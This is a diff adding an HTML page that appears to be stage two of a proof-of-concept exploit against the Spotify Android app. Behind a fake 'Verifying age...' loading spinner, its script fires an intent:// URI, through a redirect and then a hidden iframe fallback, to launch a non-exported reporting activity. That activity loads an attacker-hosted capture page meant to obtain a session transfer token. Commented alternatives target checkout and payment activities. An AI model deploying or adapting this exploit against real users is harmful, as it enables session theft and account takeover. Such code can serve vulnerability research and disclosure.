@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: #121212;
+            color: #fff;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #1DB954;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .container { text-align: center; }
+        #status { margin-top: 16px; font-size: 14px; color: #b3b3b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <div id="status">Verifying age...</div>
+    </div>
+
+    <script>
+    // =============================================================
+    // STAGE 2: Second-level Intent Redirection
+    //
+    // This page is loaded inside InAppBrowserActivity's WebView.
+    // It triggers an intent:// URI that launches ReportWebViewActivity
+    // (a non-exported component) with an attacker-controlled URL.
+    //
+    // The intent:// handler in InAppBrowserActivity (ivy.c() via mqp0.j())
+    // parses the URI via Intent.parseUri() and launches it with
+    // startActivity() - NO VALIDATION is performed on the target.
+    // =============================================================
+
+    // CHANGE THIS to your actual attacker server
+    var ATTACKER_SERVER = "https://folklorxdnelsaka.github.io/idkwebview/";
+
+    // Target: ReportWebViewActivity (non-exported)
+    // This activity reads "report_webview_url" from extras and loads it
+    // in a y111 WebView, triggering getSessionTransferToken() API call
+    var REPORT_ACTIVITY = "com.spotify.reporting.reportaction.ReportWebViewActivity";
+
+    // Construct the intent:// URI
+    // Format: intent://<data>#Intent;<params>;end
+    // S.<key>=<value> sets String extras
+    var intentUri = "intent://report#Intent;"
+        + "component=com.spotify.music/" + REPORT_ACTIVITY + ";"
+        + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+        + "end";
+
+    // Small delay to ensure page is fully loaded and WebViewClient is ready
+    setTimeout(function() {
+        document.getElementById('status').textContent = 'Redirecting...';
+
+        // Navigate to the intent:// URI
+        // This triggers: shouldOverrideUrlLoading -> mqp0.j() -> ivy.c()
+        // -> Intent.parseUri() -> startActivity()
+        window.location.href = intentUri;
+    }, 500);
+
+    // Fallback: if intent:// doesn't work via location, try other methods
+    setTimeout(function() {
+        // Method 2: iframe-based navigation
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = intentUri;
+        document.body.appendChild(iframe);
+    }, 2000);
+
+    // -------------------------------------------------------
+    // ALTERNATIVE TARGETS (uncomment to test different impacts)
+    // -------------------------------------------------------
+
+    // Target: PremiumCheckoutActivity (access checkout/billing flows)
+    // var intentUri = "intent://checkout#Intent;"
+    //     + "component=com.spotify.music/com.spotify.checkout.premiumcheckout.PremiumCheckoutActivity;"
+    //     + "end";
+
+    // Target: SpotifyCheckoutActivity (payment processing)
+    // var intentUri = "intent://checkout#Intent;"
+    //     + "component=com.spotify.music/com.spotify.checkout.spotifycheckout.SpotifyCheckoutActivity;"
+    //     + "end";
+
+    // Target: InAppBrowserLauncherActivity (launch multiple browser instances)
+    // var intentUri = "intent://browser#Intent;"
+    //     + "component=com.spotify.music/com.spotify.adsinternal.adscommon.inappbrowser.InAppBrowserLauncherActivity;"
+    //     + "end";
+    </script>
+</body>
+</html>
